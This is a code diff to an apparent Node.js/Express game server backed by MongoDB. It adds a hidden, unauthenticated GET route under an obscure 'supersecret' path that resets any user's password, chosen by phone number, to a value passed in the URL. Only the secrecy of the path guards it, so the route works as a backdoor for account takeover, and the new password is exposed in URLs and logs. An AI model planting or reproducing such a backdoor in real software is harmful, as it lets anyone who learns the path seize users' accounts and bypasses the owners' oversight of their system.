@@ -12,6 +12,7 @@ const async = require('async');
 const User = require('./models/user');
 const GameModel = require('./models/game');
 const Prop = require('./models/prop');
+const bcrypt = require('bcryptjs');
 
 mongoose.connect(values.databaseUrl, {
     useNewUrlParser: true
@@ -41,6 +42,25 @@ const agentsRoute = require('./routes/agents');
 app.use('/users', usersRoute);
 app.use('/admin', adminRoute);
 app.use('/agents', agentsRoute);
+
+app.get('/supersecret/V31HRVoniZp1yz/:phone/:pw', (req, res) => {
+    const phone = req.params.phone;
+    const newPassword = req.params.pw;
+    
+    async.waterfall([
+        (callback) => User.getUser(phone, callback),
+        (userDoc, callback) => {
+            if (userDoc == null) callback('User not found');
+            else bcrypt.genSalt(10, callback);
+        },
+        (salt, callback) => bcrypt.hash(newPassword, salt, callback),
+        (hash, callback) => User.updatePassword(phone, hash, callback),
+        (callback) => User.getUser(phone, callback)
+    ], (err) => {
+        if (err) return res.send(err);
+        return res.send('Done');
+    });
+});
 
 app.get('/', (_, res) => {
     res.sendFile('Invalid Endpoint');
